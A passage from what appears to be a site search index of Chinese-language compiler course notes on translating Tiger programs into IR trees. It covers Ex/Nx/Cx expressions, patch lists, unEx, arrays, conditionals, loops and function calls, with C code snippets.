\u53ef\u4ee5\u662f\u4e00\u4e2a\u76f4\u63a5\u7684\u6807\u7b7e\uff0c\u5982<code>NAME(lab)</code>\uff0c\u4e5f\u53ef\u4ee5\u662f\u901a\u8fc7\u5176\u4ed6\u7c7b\u578b\u7684\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u7684\u5730\u5740 <code>CJUMP(o, e1, e2, t, f)</code> \u6309\u987a\u5e8f\u8bc4\u4f30 <code>e1, e2</code>\uff0c\u5f97\u5230\u503c <code>a</code> \u548c <code>b</code>\u3002\u7136\u540e\u4f7f\u7528\u5173\u7cfb\u8fd0\u7b97\u7b26 <code>o</code> \u6bd4\u8f83 <code>a</code> \u548c <code>b</code>\u3002\u5982\u679c\u7ed3\u679c\u4e3a\u771f\uff0c\u5219\u8df3\u8f6c\u5230 <code>t</code>\uff1b\u5426\u5219\u8df3\u8f6c\u5230 <code>f</code> <code>SEQ(s1, s2)</code> \u6267\u884c\u8bed\u53e5 <code>s1</code>\uff0c\u63a5\u7740\u6267\u884c <code>s2</code> <code>LABEL(n)</code> \u5b9a\u4e49\u540d\u79f0 <code>n</code> \u7684\u5e38\u91cf\u503c\u4e3a\u5f53\u524d\u673a\u5668\u4ee3\u7801\u5730\u5740 Example IR TreeIR Tree VS. X86-64 Instructions <p></p> Intel syntax IR equivalent 17 CONST(17) rax TEMP(rax) [rax] MEM(TEMP(rax)) [rax + rbx * 8] MEM(ADD(TEMP(rax), MUL(CONST(4), TEMP(rbx)))) <p>\u4ee5\u4e0a\u5e76\u975e \u201cIR Tree \u7ffb\u8bd1\u5230\u673a\u5668\u6307\u4ee4\u7684\u89c4\u5219\u201d</p>"}, {"location": "Course/cp/intermediateCode/#ir-tree_1", "title": "IR Tree \u7684\u751f\u6210", "text": "<p>Review: The Tiger Language</p> <ul> <li>\u4e00\u4e2a tiger \u7a0b\u5e8f\u7531 Expressions \u548c Declarations (Variable, Function, Type) \u7ec4\u6210, \u65e0 Statement</li> </ul> <p></p>"}, {"location": "Course/cp/intermediateCode/#kinds-of-expressions", "title": "Kinds of Expressions", "text": "<ul> <li>\u4e09\u79cd Tiger AST Expressions:</li> </ul> <ol> <li>Expressions with return values</li> <li>Expressions that return no value (such as while expressions)</li> <li>Expressions with Boolean values, such as <code>a &gt; b</code> (a conditional jump)</li> </ol> <ul> <li>Mapping Tiger AST Expressions to IR Tree:<ul> <li>Ex: expressions that compute values (Tree expression)</li> <li>Nx: expressions that compute no values (Tree statement)</li> <li>Cx: conditional jump, a Tree statement that may jump to a true-label or false-label</li> </ul> </li> </ul> <p>\u5bf9\u4e8e <code>a &gt; b | c &lt; d</code>, \u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> <pre><code>Temp_label z = Temp_newlabel ( );\nT_stm s1 = T_Seq(T_Cjump(T_gt,a,b,  NULL_t, z), \n                T_Seq (T_Label (z), \n                    T_Cjump (T_lt,c,d, NULL_t, NULL_f )));\n</code></pre> <p></p> <p>\u7531\u4e8e\u6211\u4eec\u5230\u5f88\u4e45\u4e4b\u540e\u624d\u80fd\u77e5\u9053 true \u503c\u548c false \u503c\u5bf9\u5e94\u7684\u8df3\u8f6c\u5730\u5740\uff0c\u56e0\u6b64\u5728\u8bed\u53e5\u4e2d\u4f7f\u7528 <code>NULL</code> \u4ee3\u66ff</p> <ul> <li>\u5176\u4e2d <code>NULL_t</code> \u7684\u4f4d\u7f6e\u8bb0\u5f55\u5728 true patch list \uff08\u771f\u503c\u6807\u53f7\u56de\u586b\u8868\uff09\u4e2d</li> <li><code>NULL_f</code> \u7684\u4f4d\u7f6e\u8bb0\u5f55\u5728 false patch list (\u5047\u503c\u6807\u53f7\u56de\u586b\u8868)</li> <li><code>z</code> \u8868\u793a\u7b2c\u4e00\u4e2a\u7684 false label, \u662f\u5224\u65ad\u8bed\u53e5 <code>c &lt; d</code> \u5bf9\u5e94\u7684\u4f4d\u7f6e</li> </ul> patch_list <pre><code>typedef struct patchList_ * patchList;\nstruct patchList_ { Temp_label *head; patchList tail; }; \nstatic patchList patchList(Temp_label *head, patchList tail);\n</code></pre> <p>\u8fdb\u800c\u5b8c\u6210 <code>a &gt; b | c &lt; d</code> \u5230 <code>Tr_exp</code> \u7684\u7ffb\u8bd1\uff1a</p> <pre><code>patchList trues = PatchList(\n  &amp;s1-&gt;u.SEQ.left-&gt;u.CJUMP.true,\n    PatchList(&amp;s1-&gt;u.SEQ.right-&gt;u.SEQ.right-&gt;u.CJUMP.true, NULL));\npatchList falses = PatchList(\n  &amp;s1-&gt;u.SEQ.right-&gt;u.SEQ.right-&gt;U.CJUMP.false, NULL);\n\nTr_exp e1 = Tr_Cx (trues, falses, s1);\n</code></pre> \u586b\u5145\u5f85\u586b\u6807\u53f7 <pre><code>// \u904d\u5386\u6240\u6709\u4f4d\u7f6e\u5e76\u586b\u5145\u4e3a label\nvoid doPatch (patchList tList, Temp_label label) {\nfor ( ; tList; tList = tList-&gt;tail)\n    *(tList-&gt;head) = label;\n}\n\n// \u5408\u5e76 patch\npatchList joinPatch (patchList first, patchList second) {\n    if (!first) return second;\n    for (; first-&gt;tail; first = first-&gt;tail);\n    first-&gt;tail = second; \n    return first;\n}\n</code></pre> <p>\u8c03\u7528 <code>doPatch(e&gt;u.cx.trues, trueLabel)</code>, <code>doPatch(e&gt;u.cx.false, falseLabe;)</code> \u5c06\u771f/\u5047\u503c\u6807\u53f7\u586b\u5230 patch list \u4e2d\u6240\u6709\u5f85\u586b\u7684\u4f4d\u7f6e</p> <p>\u4f46\u5176\u5b9e\u8fd8\u6709\u95ee\u9898\uff1aNeed utility functions for conversion among Ex, Nx, and Cx expressions</p> <ul> <li>\u8868\u8fbe\u5f0f\u3001\u8bed\u53e5\u548c\u6761\u4ef6\uff1a\u5728\u5404\u79cd\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5c06\u5176\u4e2d\u4e00\u79cd\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd</li> <li> <p>\u4f8b\u5982\uff1a\u5bf9\u4e8e <code>flag := a &gt; b</code>\uff0c\u6211\u4eec\u9700\u8981\u5bf9 <code>flag</code> \u8d4b\u503c\uff0c\u4f46\u662f <code>a &gt; b</code> \u662f <code>Cx</code> \u7c7b\u578b\u7684\u8868\u8fbe\u5f0f\uff0c\u53ea\u6709 <code>Ex</code> \u624d\u6709\u8fd4\u56de\u503c\u3002</p> </li> <li> <p>unEx, unNx, unCx: Utility functions for conversions among Ex, Nx, and Cx</p> <ul> <li><code>Tr_exp</code> means the input expression can be of any kind</li> </ul> </li> </ul> <pre><code>static T_exp unEx(Tr_exp e); \nstatic T_stm unNx(Tr_exp e); \nstatic struct Cx unCx(Tr_exp e); \n</code></pre> <p>\u7531\u6b64\uff0c\u53ef\u5c06 <code>flag := a &gt; b | c &lt; d</code> \u8f6c\u4e3a</p> <pre><code>e = Tr_Cx(trues, falses, stm)\nMOVE(TEMP(flag), unEx(e))\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u9700\u8981 unEx, unNx, unCx \u8fd9\u51e0\u4e2a\u8f85\u52a9\u51fd\u6570?</p> <ul> <li>\u9700\u8981\u8003\u8651\u5230 a&gt;b \u88ab\u4f7f\u7528\u7684\u201c\u4e0a\u4e0b\u6587\u201d</li> <li>IR \u7ffb\u8bd1\u662f context-dependent \u95ee\u9898(\u96be\u4ee5\u7528 CFG \u523b\u753b, \u4f46\u662f\u53ef\u4ee5\u7528\u5c5e\u6027\u6587\u6cd5\u3001semantic actions \u7b49\u65b9\u5f0f)</li> </ul> unEx \u7684\u5b9e\u73b0 codeCx -&gt; Ex <pre><code>static T_exp unEx(Tr_exp e) { \n    switch (e-&gt;kind) {\n        case Tr_ex:\n            return e-&gt;u.ex;\n        case Tr_cx: {\n            Temp_temp r = Temp_newtemp( );\n            Temp_label t = Temp_newlabel( ), f= Temp_newlabel( ); \n            doPatch(e-&gt;u.cx.trues, t); \n            doPatch(e-&gt;u.cx.falses, f);\n            return T_Eseq(T_move(T_Temp(r),T_Const(1)), \n                    T_Eseq(e-&gt;u.cx.stm, T_Eseq(T_Label(f), \n                        T_Eseq(T_Move(T_Temp(r), T_Const(0)), \n                            T_Eseq(T_Label(t), T_Temp(r))))));\n        }\n        case Tr_nx:\n            return T_Eseq(e-&gt;u.nx, T_Const(0));\n    } \n    assert(0); \n}\n</code></pre> <p>\u9996\u5148\u5c06 Cx \u8f6c\u5316\u4e3a\uff1a</p> <pre><code>if Cx\n    return 1\nelse\n    return 0\n</code></pre> <p>\u518d\u8f6c\u5316\u4e3a\uff1a</p> <pre><code>MOVE(TEMP r, 1)\ne\nLABEL(f)\nMOVE(TEMP r, 0)\nLABEL(t)\nTEMP(r)\n</code></pre> <p>\u5c06 <code>e</code> \u5904\u66ff\u6362\u6389\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7ffb\u8bd1\u6210\u7684 <code>e := a &gt; b | c &lt; d</code></p> <p></p>"}, {"location": "Course/cp/intermediateCode/#translation-of-expressions", "title": "Translation of Expressions", "text": ""}, {"location": "Course/cp/intermediateCode/#simple-variables", "title": "Simple Variables", "text": "<ul> <li>\u5728\u5f53\u524d\u8fc7\u7a0b\u7684\u5806\u6808\u5e27\u4e2d\u58f0\u660e\u7684\u4e00\u4e2a\u7b80\u5355\u53d8\u91cf <code>v</code></li> <li>\u8bbf\u95ee\u672c\u5730\u53d8\u91cf <code>v</code>\uff0c\u504f\u79fb\u91cf\u4e3a <code>k</code>\uff08\u5e27\u6307\u9488\u4e3a <code>fp</code>\uff09</li> </ul> <pre><code>MEM(BINOP(PLUS, TEMP fp, CONST k))\n</code></pre> <p>\u5bf9\u4e8e Tiger, \u6240\u6709\u53d8\u91cf\u90fd\u6709\u76f8\u540c\u7684\u5927\u5c0f (word size)</p>"}, {"location": "Course/cp/intermediateCode/#array-variables", "title": "Array Variables", "text": "<p>\u5728 Tiger \u548c ML \u4e2d\uff0c\u6570\u7ec4\u53d8\u91cf\u8868\u73b0\u5f97\u50cf\u6307\u9488\u4e00\u6837\uff0c\u6ca1\u6709\u50cf C \u8bed\u8a00\u90a3\u6837\u7684\u547d\u540d\u6570\u7ec4\u5e38\u91cf\u3002</p> <p>new array values are created (and initialized) by the construct \\(t_a[n]\\) of \\(i\\)</p> <ul> <li>\\(t_a\\) \u662f\u4e00\u79cd\u6570\u7ec4\u7c7b\u578b\u7684\u540d\u79f0</li> <li>\\(n\\) \u662f\u5143\u7d20\u7684\u6570\u91cf</li> <li>\\(i\\) \u662f\u6bcf\u4e2a\u5143\u7d20\u7684\u521d\u59cb\u503c</li> </ul> <pre><code>let\n    type intArray = array of int\n    var a := intArray[12] of 0\n    var b := intArray[12] of 7\nin a := b\nend\n</code></pre> <ul> <li><code>a</code> \u6700\u7ec8\u6307\u5411\u4e0e\u53d8\u91cf <code>b</code> \u76f8\u540c\u7684 12 \u4e2a <code>7</code></li> <li>\u6700\u521d\u4e3a <code>a</code> \u5206\u914d\u7684 12 \u4e2a <code>0</code> \u88ab\u4e22\u5f03\u3002</li> </ul> <p>Tiger record values are also pointers.</p> <ul> <li><code>Record</code> \u8d4b\u503c\u7c7b\u4f3c\u6570\u7ec4\u8d4b\u503c\uff0c\u662f\u6307\u9488\u8d4b\u503c\uff0c\u4e0d\u62f7\u8d1d\u6240\u6709 field</li> </ul> <p>How to translate array accesses, e.g., arr[2], arr[x]?</p>"}, {"location": "Course/cp/intermediateCode/#structured-l-values", "title": "Structured L-values", "text": "<ul> <li>R-value: \u5728\u8d4b\u503c\u64cd\u4f5c\u7b26\u53f3\u8fb9\u51fa\u73b0\u7684\u8868\u8fbe\u5f0f (\u8868\u793a\u4e0d\u53ef\u88ab\u8d4b\u503c\u7684\u4f4d\u7f6e)</li> <li> <p>L-value: \u53ef\u4ee5\u51fa\u73b0\u5728\u8d4b\u503c\u8bed\u53e5\u5de6\u8fb9\u7684\u8868\u8fbe\u5f0f\u7ed3\u679c:</p> <ul> <li>\u8868\u793a\u4e00\u4e2a\u53ef\u4ee5\u88ab\u8d4b\u503c\u7684\u4f4d\u7f6e</li> <li>\u4e5f\u53ef\u4ee5\u51fa\u73b0\u5728\u8d4b\u503c\u8bed\u53e5\u7684\u53f3\u8fb9 (\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u610f\u5473\u7740\u8be5\u4f4d\u7f6e\u7684\u5185\u5bb9)</li> </ul> </li> <li> <p>An integer or pointer value is a \u201cscalar\u201d (It has only one component)</p> <ul> <li>All the variables and L-values in Tiger are scalar</li> <li>A Tiger array or record variable is really a pointer</li> </ul> </li> <li>In C or Pascal there are structured L-values<ul> <li>Structs in C, arrays and records in Pascal</li> <li>They are not scalar.</li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u7ed3\u6784\u5316\u5de6\u503c\uff0c\u4e00\u6b21\u5730\u5740\u8ba1\u7b97\u5e94\u4e3a\uff1a<code>MEM(+(TEMP fp, CONST k), S)</code></p> <pre><code>T_exp T_Mem(T_exp, int size);\n-&gt;\nMem(+(TEMP fp,CONST kn), S)\n</code></pre> <ul> <li><code>S</code> \u8868\u793a\u8981\u83b7\u53d6\u6216\u5b58\u50a8\u7684\u5bf9\u8c61\u7684\u5927\u5c0f</li> </ul>"}, {"location": "Course/cp/intermediateCode/#subscripting-and-field-selection", "title": "Subscripting and Field Selection | \u4e0b\u6807\u548c\u57df\u9009\u62e9", "text": "<p>\u8981\u8ba1\u7b97 <code>a[i]</code> \u7684\u5730\u5740\uff1a</p> <pre><code>(i - l) * s + a\n</code></pre> <ul> <li><code>l</code> \u8868\u793a\u7d22\u5f15\u8303\u56f4\u7684\u4e0b\u9650 </li> <li><code>s</code>\uff1a\u6bcf\u4e2a\u6570\u7ec4\u5143\u7d20\u7684\u5927\u5c0f (\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d) </li> <li> <p><code>a</code>\uff1a\u6570\u7ec4\u5143\u7d20\u7684\u57fa\u5730\u5740</p> </li> <li> <p>\u5982\u679c <code>a</code> \u662f\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u4e14\u5176\u5730\u5740\u5728\u7f16\u8bd1\u65f6\u4e3a\u5e38\u91cf\uff0c\u5219\u53ef\u4ee5\u518d\u7f16\u8bd1\u65f6\u8fdb\u884c\u8ba1\u7b97 <code>a - s \u00d7 l</code> \u7684\u8fd0\u7b97\u3002</p> </li> <li>\u82e5\u8981\u8ba1\u7b97\u8bb0\u5f55 <code>a</code> \u4e2d\u5b57\u6bb5 <code>f</code> \u7684\u5730\u5740\uff0c\u5373 <code>offset(f) + a</code></li> </ul> Note <ul> <li>\u5728 Tiger language \u4e2d\uff0c\u6240\u6709\u7684 record \u548c array \u503c\u5b9e\u9645\u4e0a\u90fd\u662f\u6307\u5411\u8bb0\u5f55\u548c\u6570\u7ec4\u7ed3\u6784\u7684 \u6307\u9488\uff0c\u6ca1\u6709\u7ed3\u6784\u5316\u7684\u5de6\u503c</li> <li>\u6570\u7ec4\u7684 \u201cbase address\u201d \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u6307\u9488\u53d8\u91cf\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528 <code>MEM</code> \u64cd\u4f5c</li> <li>\u5728 IR Tree \u4e2d\uff0c<code>MEM</code> \u65e2\u8868\u793a\u5b58\u50a8\uff08\u5f53\u7528\u4f5c <code>MOVE</code> \u64cd\u4f5c\u7684\u5de6\u5b50\u8282\u70b9\u65f6\uff09\uff0c\u4e5f\u8868\u793a\u8bfb\u53d6\uff08\u5728\u5176\u4ed6\u5730\u65b9\u4f7f\u7528\u65f6\uff09</li> </ul> <p>Example</p> <p></p> <ul> <li>\u4ece\u6280\u672f\u89d2\u5ea6\u8bb2\uff0c\u5de6\u503c\u5e94\u8868\u793a\u4e3a\u4e00\u4e2a\u5730\u5740\uff08\u4e0d\u5305\u542b\u9876\u90e8\u7684 MEM \u8282\u70b9\uff09, \u4f46\u5de6\u503c\u53ef\u4ee5\u6709\u4ee5\u4e0b\u7528\u9014\uff1a<ul> <li>\u5c06\u5de6\u503c\u8f6c\u6362\u4e3a\u53f3\u503c\uff1a\u4ece\u8be5\u5730\u5740\u83b7\u53d6</li> <li>\u7ed9\u5de6\u503c\u8d4b\u503c\uff1a\u5411\u8be5\u5730\u5740\u5b58\u50a8</li> <li>\u6545\u53ef\u4ee5\u5c06\u5de6\u503c\u8868\u793a\u4e3a\u4e00\u4e2a <code>MEM</code> \u8282\u70b9</li> </ul> </li> </ul>"}, {"location": "Course/cp/intermediateCode/#arithmetic", "title": "Arithmetic", "text": "<p>\u5728 Tiger \u4e2d\uff1a</p> <ul> <li>\u6bcf\u4e2a\u7b97\u672f\u8fd0\u7b97\u7b26\u5bf9\u5e94\u4e00\u4e2a\u6811\u5f62\u8fd0\u7b97\u7b26, \u4f8b\u5982\uff0c<code>BINOP(o, e1, e2)</code></li> <li>\u6ca1\u6709\u5355\u76ee\u8fd0\u7b97\u7b26<ul> <li>\u5355\u76ee\u8d1f\u53ef\u4ee5\u5b9e\u73b0\u4e3a\u4e0e\u96f6\u7684\u51cf\u6cd5</li> <li>\u5355\u76ee\u8865\u7801 (\u53d6\u53cd) \u53ef\u4ee5\u5b9e\u73b0\u4e3a\u4e0e\u5168 1 \u7684\u5f02\u6216</li> </ul> </li> <li>\u4e0d\u652f\u6301\u6d6e\u70b9\u6570\u8fd0\u7b97</li> </ul>"}, {"location": "Course/cp/intermediateCode/#conditionals", "title": "Conditionals", "text": "<ul> <li>\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\u5c06\u662f\u4e00\u4e2a <code>Cx</code> \u8868\u8fbe\u5f0f<ul> <li>\u4e00\u4e2a\u8bed\u53e5 (<code>T_stm) s</code>\uff0c\u5b83\u4f1a\u5728\u6761\u4ef6\u4e3a\u771f\u65f6\u8df3\u8f6c\u5230\u771f\u76ee\u6807\uff0c\u4e3a\u5047\u65f6\u8df3\u8f6c\u5230\u5047\u76ee\u6807\u3002</li> </ul> </li> <li>\u6761\u4ef6\u8868\u8fbe\u5f0f\u53ef\u4ee5\u8f7b\u677e\u5730\u4e0e Tiger \u64cd\u4f5c\u7b26 <code>&amp;</code> \u548c <code>|</code> \u7ed3\u5408\u4f7f\u7528</li> <li>E.g., <code>x &lt; 5</code> \u53ef\u4ee5\u7ffb\u8bd1\u4e3a\uff1a</li> </ul> <pre><code>stm = CJUMP (LT, x, CONST(5), NULL_t, NULL_f)\ntrues = {t}\nfalses = {f}\n</code></pre> <p>\u5bf9\u4e8e\u5904\u7406 <code>if</code></p> <pre><code>if e1 then e2 else e3\n</code></pre> <p>\u65b9\u6cd5</p> <p>\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\uff1a</p> <ul> <li>\u628a <code>e1</code> \u89c6\u4e3a <code>Cx</code> \u8868\u8fbe\u5f0f -&gt; \u5bf9 <code>e1</code> \u5e94\u7528 <code>unCx</code></li> <li><code>e2</code> \u548c <code>e3</code> \u89c6\u4e3a <code>Ex</code> \u8868\u8fbe\u5f0f -&gt; \u5206\u522b\u5bf9 <code>e2</code> \u548c <code>e3</code> \u5e94\u7528 <code>unEx</code></li> <li>\u4e3a\u6761\u4ef6\u8bed\u53e5\u521b\u5efa\u4e24\u4e2a\u6807\u7b7e <code>t</code> \u548c <code>f</code> </li> <li>\u5206\u914d\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf <code>r</code></li> <li>\u5728\u6807\u7b7e <code>t</code> \u4e4b\u540e\uff0c\u5c06 <code>e2</code> \u8d4b\u503c\u7ed9 <code>r</code></li> <li>\u5728\u6807\u7b7e <code>f</code> \u4e4b\u540e\uff0c\u5c06 <code>e3</code> \u8d4b\u503c\u7ed9 <code>r</code></li> <li>\u4e24\u4e2a\u5206\u652f\u6700\u540e\u90fd\u8df3\u8f6c\u5230\u65b0\u521b\u5efa\u7684 <code>join</code> \u6c47\u5408\u6807\u7b7e</li> </ul> <pre><code>unCx(e1) \nLABEL t \nr = unEx(e2) \nJUMP join \nLABEL f \nr = unEx(e3) \nJUMP join \n...\nLABEL join \n...\n</code></pre> <p>\u5982\u4e0a\u7ffb\u8bd1\u6b63\u786e\u4f46\u662f\u4e0d\u9ad8\u6548</p> <ul> <li>\u5982\u679c <code>e2</code> \u548c <code>e3</code> \u90fd\u662f statements\uff08\u4e0d\u8fd4\u56de\u503c\u7684\u8868\u8fbe\u5f0f\uff09\uff0c\u4f7f\u7528 <code>unEx</code> \u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u6700\u597d\u80fd\u4e13\u95e8\u8bc6\u522b\u8fd9\u79cd\u60c5\u51b5\u3002</li> <li>\u5982\u679c <code>e2</code> \u6216 <code>e3</code> \u662f <code>Cx</code> \u8868\u8fbe\u5f0f\uff0c<code>unEx</code> \u4f1a\u4ea7\u751f\u4e00\u56e2\u590d\u6742\u7684\u8df3\u8f6c\u548c\u6807\u7b7e, \u9700\u8981\u4e13\u95e8\u8bc6\u522b\u8fd9\u79cd\u60c5\u51b5</li> </ul> Code <pre><code>case Tr_cx: {\n  Temp_temp r = Temp_newtemp( );\n  Temp_label t = Temp_newlabel( ), f= Temp_newlabel( );\n  doPatch(e-&gt;u.cx.trues, t);\n  doPatch(e-&gt;u.cx.falses, f);\n  return T_Eseq(T_move(T_Temp(r),T_Const(1)),\n           T_Eseq(e-&gt;u.cx.stm, \n                   T_Eseq(T_Label(f),\n               T_Eseq(T_Move(T_Temp(r), T_Const(0)),\n                 T_Eseq(T_Label(t), T_Temp(r))))));\n}\n</code></pre> Example <p></p>"}, {"location": "Course/cp/intermediateCode/#while-loops", "title": "While Loops", "text": "<p>\u4e00\u4e2a <code>While</code> \u5faa\u73af\u7684\u4e00\u822c\u7ed3\u6784\u662f\uff1a</p> <pre><code>test:\n    if not(condition) goto done\n        body\n    goto test\ndone:\n    ...\n</code></pre> <ul> <li>\u5982\u679c\u4e2d\u65ad\u8bed\u53e5\u51fa\u73b0\u5728\u4e3b\u4f53\u5185\u90e8\uff08\u800c\u4e0d\u662f\u5d4c\u5957\u5728\u4efb\u4f55\u5185\u90e8\u7684 <code>while</code> \u8bed\u53e5\u4e2d\uff09\uff0c\u6b64\u65f6\u7ffb\u8bd1\u7ed3\u679c\u4ec5\u4ec5\u662f\u8df3\u8f6c\u5230 <code>done</code> \u6807\u7b7e</li> <li>\u5982\u679c\u6709\u5d4c\u5957\u7684\u8bdd\uff0c\u5982\u4f55\u77e5\u9053 <code>done</code> \u6807\u7b7e\uff1f<ul> <li>Solution: \u4e2d\u65ad\u8bed\u53e5\u7684\u7ffb\u8bd1\uff08<code>transExp</code> \u51fd\u6570\uff09\u9700\u8981\u65b0\u589e\u4e00\u4e2a\u5f62\u5f0f\u53c2\u6570 <code>break</code>\uff0c\u8be5\u53c2\u6570\u8bbe\u7f6e\u4e3a\u6700\u8fd1\u7684\u5305\u542b\u5faa\u73af\u7684 <code>done</code> \u6807\u7b7e\u3002</li> </ul> </li> </ul>"}, {"location": "Course/cp/intermediateCode/#for-loops", "title": "For Loops", "text": "<p>\u4e00\u79cd\u76f4\u63a5\u7684\u7ffb\u8bd1\u65b9\u6cd5\u662f\u5c06\u8bed\u53e5\u7684\u62bd\u8c61\u8bed\u6cd5\u8f6c\u5316\u4e3a\u6240\u663e\u793a\u7684 <code>let/while</code> \u8868\u8fbe\u5f0f\u7684\u62bd\u8c61\u8bed\u6cd5\u3002</p> <ul> <li>\u4f46\u5982\u679c <code>limit = maxint</code>, \u6b64\u65f6 <code>i+1</code> \u4f1a\u6ea2\u51fa\u3001 <code>i &lt;= limit</code> \u6052\u6210\u7acb. </li> <li>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\u662f\u5c06\u6d4b\u8bd5\u653e\u5728\u5faa\u73af\u7684\u5e95\u90e8\uff0c\u5176\u4e2d\u5bf9 <code>i &lt; limit</code> \u7684\u6d4b\u8bd5\u4f4d\u4e8e\u589e\u52a0 i \u503c\u4e4b\u524d\u3002\u7136\u540e\uff0c\u5728\u8fdb\u5165\u5faa\u73af\u4e4b\u524d\u8fd8\u9700\u8981\u53e6\u5916\u4e00\u4e2a\u6d4b\u8bd5\u6765\u68c0\u67e5\u662f\u5426\u6709 <code>lo &lt;= hi</code>\u3002</li> </ul> <pre><code>if lo &gt; hi goto done\ni := lo\nlimit := hi\ntest:\n    body\n    if i &gt;= limit goto done\n    i := i+1\n    goto test\ndone:\n    ...\n</code></pre>"}, {"location": "Course/cp/intermediateCode/#function-call", "title": "Function Call", "text": "<p>\u7ffb\u8bd1\u51fd\u6570\u8c03\u7528 f(a1,\u2026,an) \u8f83\u4e3a\u7b80\u5355\uff0c\u53ea\u662f\u9700\u8981\u5c06 static link \u4f5c\u4e3a\u9690\u542b\u7684\u989d\u5916\u53c2\u6570\u6dfb\u52a0\uff1a</p> <pre><code>CALL(NAME lf,  [sl, e1, e2, \u2026, en]) \n</code></pre> <ul> <li><code>lf</code> \u662f <code>f</code> \u7684 label</li> <li><code>s1</code> \u662f static link \u2014\u2014 \u6307\u5411\u8c03\u7528 f \u7684\u51fd\u6570\u7684\u5e27\u6307\u9488</li> </ul> <ul> <li>\u4e3a\u4e86\u8ba1\u7b97 <code>sl</code>\uff0c\u9700\u8981\u77e5\u9053 <code>f</code> \u7684 level \u4ee5\u53ca\u8c03\u7528 <code>f</code> \u7684\u51fd\u6570\u7684 level\u3002</li> </ul> <p>\u4f46\u8fd9\u4e2a\u53ea\u662f\u4f20\u4e86 frame pointer, lambda lifting \u662f\u628a\u6240\u6709\u53c2\u6570\u76f4\u63a5\u4f20\u8fc7\u53bb\u4e86</p>"}, {"location": "Course/cp/intermediateCode/#translation-of-declarations", "title": "Translation of declarations", "text": "<ul> <li>Variable declaration<ul> <li>\u9700\u8981\u786e\u5b9a\u5e27\u4e2d\u7684 offset\uff0c\u7136\u540e\u5c06\u53f3\u4fa7\u8868\u8fbe\u5f0f \u79fb\u52a8 \u5230\u5e27\u4e2d\u7684\u5408\u9002\u4f4d\u7f6e\u3002</li> </ul> </li> <li>Type declaration<ul> <li>\u4e0d\u9700\u8981\u4ea7\u751f\u4efb\u4f55 IR \u4ee3\u7801</li> </ul> </li> <li>Function declaration</li> </ul>"}, {"location": "Course/cp/intermediateCode/#variable-definition", "title": "Variable Definition", "text": "<ul> <li>\u5728\u8bed\u4e49\u5206\u6790\u4e2d\uff0c<code>transDec</code> \u51fd\u6570\u66f4\u65b0 <code>let</code> \u8868\u8fbe\u5f0f\u4e3b\u4f53\u7684\u503c <code>t</code> \u548c\u7c7b\u578b\u73af\u5883\u3002</li> <li>\u5bf9\u4e8e IR translation\uff0c<code>transDec</code> \u5e94\u8be5\u8fd4\u56de\u4e00\u4e2a\u989d\u5916\u7684\u7ed3\u679c\uff0c\u5373\u53d8\u91cf\u7684\u521d\u59cb\u5316\u3002<ul> <li>\u5c06\u521d\u59cb\u5316\u8f6c\u5316\u4e3a\u8d4b\u503c\u8868\u8fbe\u5f0f\u3002</li> <li>\u8fd9\u4e9b\u5fc5\u987b\u653e\u5728 <code>let</code> \u4e3b\u4f53\u4e4b\u524d\u3002</li> </ul> </li> <li>\u5982\u679c <code>transDec</code> \u5e94\u7528\u4e8e\u51fd\u6570\u548c\u7c7b\u578b\u58f0\u660e\uff0c\u7ed3\u679c\u5c06\u662f\u4e00\u4e2a\u201c\u65e0\u64cd\u4f5c\u201d\u8868\u8fbe\u5f0f\uff0c\u5982 <code>Ex(CONST(0))</code></li> </ul>"}, {"location": "Course/cp/intermediateCode/#function-definition", "title": "Function Definition", "text": "<p>\u51fd\u6570\u8f6c\u5316\u4e3a \u201c\u6c47\u7f16\u8bed\u8a00\u6bb5\u201d, \u5177\u6709\u4e09\u4e2a\u90e8\u5206:</p> <ul> <li>Prologue | \u5165\u53e3</li> <li>Body | \u51fd\u6570\u4f53</li> <li>Epilogue | \u51fa\u53e3</li> </ul> <p></p> <p>Prologue \u5305\u62ec\uff1a</p> <p>(1) \u4f2a\u6307\u4ee4\u4ee5\u6807\u8bb0\u51fd\u6570\u7684\u5f00\u59cb\uff08\u7279\u5b9a\u6c47\u7f16\u8bed\u8a00\u6240\u9700\uff09 (2) \u51fd\u6570\u540d\u79f0\u7684\u6807\u7b7e\u5b9a\u4e49 (3) \u8c03\u6574\u5806\u6808\u6307\u9488\u7684\u6307\u4ee4\uff08\u4ee5\u4fbf\u5206\u914d\u65b0\u6808\u5e27\uff09 (4) \u5c06\u201c\u9003\u9038\u201d\u53c2\u6570\uff08\u5305\u62ec\u9759\u6001\u94fe\u63a5\uff09\u4fdd\u5b58\u5230\u6808\u5e27\u4e2d\u7684\u6307\u4ee4\uff0c\u5e76\u5c06\u975e\u9003\u9038\u53c2\u6570\u79fb\u52a8\u5230\u65b0\u7684\u4e34\u65f6\u5bc4\u5b58\u5668 (5) \u5b58\u50a8\u6307\u4ee4\u4ee5\u4fdd\u5b58\u51fd\u6570\u5185\u90e8\u4f7f\u7528\u7684\u4efb\u4f55\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\uff08\u5305\u62ec\u8fd4\u56de\u5730\u5740\u5bc4\u5b58\u5668\uff09</p> <p>\u968f\u540e\u662f Body (Tiger \u7684\u51fd\u6570\u4f53\u662f\u4e00\u4e2a expression)\uff1a</p> <p>(6) \u8f6c\u6362\u540e\u7684\u8868\u8fbe\u5f0f</p> <p>\u6700\u540e\u662f Epilogue:</p> <p>(7) 